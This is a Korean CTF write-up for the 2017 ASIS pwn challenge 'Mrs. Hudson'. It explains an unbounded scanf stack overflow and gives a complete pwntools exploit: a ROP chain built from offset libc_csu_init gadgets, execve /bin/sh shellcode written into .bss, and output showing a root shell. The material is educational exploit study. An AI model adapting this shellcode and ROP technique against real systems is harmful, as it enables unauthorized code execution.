# [2017_ASIS] \[PWN] Mrs. Hudson

### Problem

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [sp+10h] [bp-70h]@1

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Let's go back to 2000.");
  return __isoc99_scanf("%s", &v4);
}
```

Stack based Overflow가 발생할 것 같아 보입니다.



### Exploit

NX가 걸려있지 않기 때문에 shellcode를 올린 후, 그 주소로 점프하면 됩니다. 시스템에 ASLR이 걸려있지 않았다면 쉬운 문제였겠지만 ASLR이 걸려있었습니다.

ROP를 이용해야 합니다. 겉보기에는 가젯이 없어보이지만 아래와 같이 주솟값을 twist하는 트릭을 이용하여 가젯을 찾을 수 있습니다. 이 트릭을 이용할 수 있는지가 문제의 핵심이었습니다.

```
gdb-peda$ x/3i 0x4006f1
   0x4006f1 <__libc_csu_init+97>:	pop    rsi
   0x4006f2 <__libc_csu_init+98>:	pop    r15
   0x4006f4 <__libc_csu_init+100>:	ret    
gdb-peda$ x/3i 0x4006f3
   0x4006f3 <__libc_csu_init+99>:	pop    rdi
   0x4006f4 <__libc_csu_init+100>:	ret  
```



```python
from pwn import *

ret = 0x4004ee
popret = 0x400575
addesp_8 = 0x4004eb

shellcode = (
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)

pop_rdi_ret = 0x4006f3
pop_rsi_pop_r15_ret = 0x4006f1
bss = 0x601060

p = process("mrs._hudson")
#p = remote("178.62.249.106",8642)
print p.recv()
payload = "\x90"*(0x70)
payload += p64(bss)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(bss)
payload += p64(0)
payload += p64(0x400676)		# scanf("%s", bss)
payload += p64(bss)
payload += p64(bss)
p.sendline(payload)
raw_input()
p.sendline("a"*8 + p64(bss+16) + shellcode)
p.interactive()
```



### 결과

```
# python ex.py 
[!] Could not find executable 'mrs._hudson' in $PATH, using './mrs._hudson' instead
[+] Starting local process './mrs._hudson': pid 12982
Let's go back to 2000.


[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

